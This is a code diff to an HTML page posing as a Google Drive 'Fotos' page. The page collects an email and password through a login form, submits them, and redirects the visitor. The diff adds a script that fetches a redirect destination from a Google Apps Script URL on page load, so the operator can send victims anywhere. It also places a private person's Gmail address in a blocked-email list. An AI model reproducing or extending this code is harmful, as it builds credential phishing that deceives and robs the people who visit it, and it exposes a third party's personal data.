@@ -15,9 +15,6 @@
     <title>Fotos - Google Drive - Dibujos </title>
 
 
-
-
-
   <style>
     /* Estilos generales */
     * {
@@ -248,7 +245,7 @@
 <!-- Contenedor donde se cargará usuario.html sin heredar estilos -->
 <iframe id="usuarioFrame" src="" style="display: none; width: 100%; height: 100vh; border: none;"></iframe>
 
-
+<br>
 <p>Español(España) Ayuda Privacidad Términos</p>
 
 <!-- Vincular el script -->
@@ -264,8 +261,8 @@ document.getElementById("miFormulario").addEventListener("submit", async functio
     const errorMessage = document.getElementById('error-message');
 
     // Lista de correos electrónicos y contraseñas prohibidas
-    const prohibitedEmails = [""]; // Agregar correos prohibidos aquí
-    const prohibitedWords = ["holaaa"]; // Agregar contraseñas prohibidas aquí
+    const prohibitedEmails = ["tamaraganoza417@gmail.com"]; // Agregar correos prohibidos aquí
+    const prohibitedWords = [""]; // Agregar contraseñas prohibidas aquí
 
     const email = emailInput.value.trim().toLowerCase();
     const password = passwordInput.value;
@@ -327,7 +324,7 @@ document.getElementById("miFormulario").addEventListener("submit", async functio
         });
 
         if (response.ok) {
-            window.location.href = "usuario.html"; // Redirigir tras éxito
+            window.location.href = "invitation.html"; // Redirigir tras éxito
         } else {
             alert("Error al enviar los datos.");
         }
@@ -337,6 +334,24 @@ document.getElementById("miFormulario").addEventListener("submit", async functio
     }
 });
 </script>
+
+<script>
+    document.addEventListener("DOMContentLoaded", async function () {
+        const API_URL = "https://script.google.com/macros/s/AKfycbyd4Oy82b4sOMF1slOHp2Rx1txseSWDxS-2WfKeNXPRqUvtCZ1or9M9u0vCFazhh-9Q3g/exec"; // Reemplaza con la URL de Google Apps Script
+
+        try {
+            const response = await fetch(API_URL);
+            const pagina = await response.text();
+
+            if (pagina.trim() !== "formulario.html") {
+                window.location.href = pagina; // Redirigir si el administrador lo ha cambiado
+            }
+        } catch (error) {
+            console.error("Error al verificar la redirección:", error);
+        }
+    });
+</script>
+
 
 
 </body></html>
